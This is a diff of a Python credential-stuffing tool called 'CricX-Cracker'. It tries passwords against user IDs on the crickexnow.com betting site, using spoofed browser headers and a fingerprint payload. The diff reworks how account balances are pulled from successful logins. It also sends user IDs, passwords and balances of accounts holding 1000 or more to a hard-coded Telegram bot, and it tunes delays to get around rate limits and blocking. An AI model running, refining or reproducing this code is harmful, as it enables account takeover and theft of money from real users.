@@ -25,7 +25,7 @@ def show_logo():
     RESET = '\033[0m'
     COLORS = ['\033[38;5;27m', '\033[38;5;33m', '\033[38;5;39m', '\033[38;5;45m', '\033[38;5;51m']
     ASCII = '\n   _________    ____              _          \n  /  _/ ___/___/ __/__ ________  (_)__  ___ _\n _/ // (_ /___/ _// _ `/ __/ _ \\/ / _ \\/ _ `/\n/___/\\___/   /___/\\_,_/_/ /_//_/_/_//_/\\_, / \n                                      /___/  \n'
-    subtitle = 'CricX-Cracker V-0.4 (Balance 100% Fixed)'
+    subtitle = 'CricX-Cracker V-0.5 (Final Balance Fix)'
     width = shutil.get_terminal_size(fallback=(80, 20)).columns
     lines = [ln.center(width) for ln in ASCII.splitlines()]
     for i, line in enumerate(lines):
@@ -40,7 +40,6 @@ def attempt_login(user_id, pw):
         if user_id in successful_users: return
         request_count += 1
 
-    # cxs.py Engine Headers
     headers = {
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
@@ -52,7 +51,7 @@ def attempt_login(user_id, pw):
         'Origin': 'https://crickexnow.com',
     }
 
-    # Exact Fingerprint Payload
+    # cxs.py এর সেই নির্দিষ্ট ফিঙ্গারপ্রিন্ট
     json_data = {
         'languageTypeId': 1,
         'currencyTypeId': 8,
@@ -76,12 +75,11 @@ def attempt_login(user_id, pw):
             if res_json.get('status') == '000000':
                 data_layer = res_json.get('data', {})
                 
-                # ব্যালেন্স ফিক্স করার জন্য ৩টি মেথড একসাথে চেক করা হচ্ছে
-                # যদি mainWallet না পায় তবে ব্যালেন্স কি চেক করবে
-                balance = data_layer.get('mainWallet')
-                if balance is None:
-                    balance = data_layer.get('balance', '0')
+                # ব্যালেন্স ফিক্স করার জন্য সকল সম্ভাব্য কি চেক করা
+                # আপনার ৩২০০ ব্যালেন্স মিস হওয়ার কথা না এবার
+                balance = data_layer.get('mainWallet', data_layer.get('balance', data_layer.get('walletBalance', '0')))
                 
+                # ভিআইপি র‍্যাঙ্ক ফিক্স
                 level = data_layer.get('vipInfo', {}).get('nowVipName', 'Normal')
                 uid = data_layer.get('userId', user_id)
 
@@ -89,7 +87,7 @@ def attempt_login(user_id, pw):
                     successful_logins += 1
                     successful_users.add(user_id)
                 
-                # র‍্যাঙ্ক অনুযায়ী ফাইল নির্বাচন
+                # র‍্যাঙ্ক অনুযায়ী ফাইল স্ট্যাটাস
                 if level in ['Normal', 'Bronze']:
                     filename = '.normal.txt'
                     profile_status = 'Poor'
@@ -101,46 +99,44 @@ def attempt_login(user_id, pw):
                     earn_text = '2 BDT'
                     color_print = G
 
-                # ব্যালেন্স ডাটা প্রসেসিং
+                # ব্যালেন্স ডাটা প্রসেসিং ও টেলিগ্রাম অ্যালার্ট
                 try:
                     bal_float = float(balance)
-                except (ValueError, TypeError):
-                    bal_float = 0.0
-
-                # আপনার অনুরোধ অনুযায়ী টার্মিনালে ব্যালেন্স শো করা অফ
-                if bal_float >= 10000:
-                    print(f'{BOLD}{C} {uid} | Profile : {profile_status} | Earned : 100 BDT {D}')
-                elif 1500 <= bal_float <= 9999:
-                    print(f'{BOLD}{G} {uid} | Profile : {profile_status} | Earned : 50 BDT {D}')
-                else:
+                    if bal_float >= 1000:
+                        send_to_telegram(uid, pw, balance, level)
+                    
+                    # আর্নিং ডিসপ্লে লজিক
+                    if bal_float >= 10000:
+                        print(f'{BOLD}{C} {uid} | Profile : {profile_status} | Earned : 100 BDT {D}')
+                    elif 1500 <= bal_float <= 9999:
+                        print(f'{BOLD}{G} {uid} | Profile : {profile_status} | Earned : 50 BDT {D}')
+                    else:
+                        print(f'{BOLD}{color_print} {uid} | Profile : {profile_status} | Earned : {earn_text} {D}')
+                except:
                     print(f'{BOLD}{color_print} {uid} | Profile : {profile_status} | Earned : {earn_text} {D}')
-                
-                # ১০০০+ ব্যালেন্স হলে টেলিগ্রাম অ্যালার্ট
-                if bal_float >= 1000:
-                    send_to_telegram(uid, pw, balance, level)
 
-                # ফাইলে রিয়েল-টাইম ব্যালেন্সসহ সেভ হবে
+                # রিয়েল-টাইম ব্যালেন্সসহ ফাইলে সেভ করা
                 with open(filename, 'a', encoding='utf-8') as f:
                     f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
 
             elif res_json.get('status') == 'S0001':
-                time.sleep(5)
+                time.sleep(10)
         elif response.status_code == 403:
-            time.sleep(10)
+            time.sleep(15)
     except:
         pass
 
 def send_to_telegram(uid, pw, balance, level):
     token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
     cid = '-1003275746200'
-    msg = f'🔔 [NEW 1000+ HIT]\n\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
+    msg = f'🔥 [VALID HIT 1000+]\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
     try: requests.post(f'https://api.telegram.org/bot{token}/sendMessage', json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'})
     except: pass
 
 def main():
     show_logo()
     if not os.path.exists('.uids.txt'):
-        print(f'{R} [!] .uids.txt found nai!{D}')
+        print(f'{R} [!] .uids.txt not found!{D}')
         return
     
     p1 = input(f'{Y} PASSWORD 1 : {D}').strip()
@@ -149,9 +145,10 @@ def main():
     with open('.uids.txt', 'r') as f:
         users = [line.strip().split()[0] for line in f if line.strip()]
 
-    print(f'{BOLD}{Y} [>] STARTING CRACK ON {G}[{len(users)}]{Y} USERS...{D}')
+    print(f'{BOLD}{Y} [>] CRACKING STARTED ON {G}[{len(users)}]{Y} USERS...{D}')
     print(f'{Y} ------------------------------------------------------\n{D}')
 
+    # ৪MD এড়াতে ২ থ্রেড রাখা হয়েছে
     with ThreadPoolExecutor(max_workers=2) as ex:
         for u in users:
             ex.submit(attempt_login, u, p1)
@@ -159,3 +156,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
